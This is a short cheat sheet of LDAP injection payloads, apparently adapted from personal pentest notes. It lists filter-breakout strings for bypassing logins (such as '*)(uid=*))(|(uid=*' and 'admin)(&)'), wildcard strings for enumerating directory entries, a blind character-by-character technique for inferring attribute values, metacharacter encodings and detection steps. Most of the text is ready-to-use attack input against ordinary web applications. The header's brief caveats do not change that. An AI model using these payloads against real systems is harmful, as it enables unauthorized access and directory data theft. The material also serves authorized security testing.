# LDAP injection payloads  (adapted from the user's 0daysec notes: ldap-Injection.md)
# Benign auth bypass / minimal enumeration. Rate-limit wildcard queries. No bulk directory dump.

## Auth bypass (filter breakout)
Typical vulnerable filter: `(&(uid=<USER>)(userPassword=<PASS>))`
```
# username field:
*                              # match any
*)(uid=*))(|(uid=*             # classic breakout -> (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
admin)(&)                      # -> (&(uid=admin)(&))  always-true tail
admin)(|(uid=*                 # OR any
# password field:
*                              # wildcard password
*)(uid=*
```

## Wildcard enumeration
```
# search field:
a*        b*  ...              # enumerate entries by prefix
*)(mail=*                      # pull entries with a mail attribute
*)(objectClass=*               # list object classes
```

## Blind boolean (attribute presence)
Infer a value by whether a filter matches (response differs):
```
admin)(description=secret*)    # true if description starts with 'secret'
admin)(description=secreta*)   # narrow char by char
```

## Metacharacters
`( ) * | & = \ NUL` — LDAP filter special chars. Encode as needed (`\28`=`(`, `\29`=`)`, `\2a`=`*`).

## Detection
Inject `*` or `)(` into a login/search param; a result change (auth success, more/different entries,
filter error) flags LDAP injection. Confirm with a benign auth bypass or minimal enumeration.
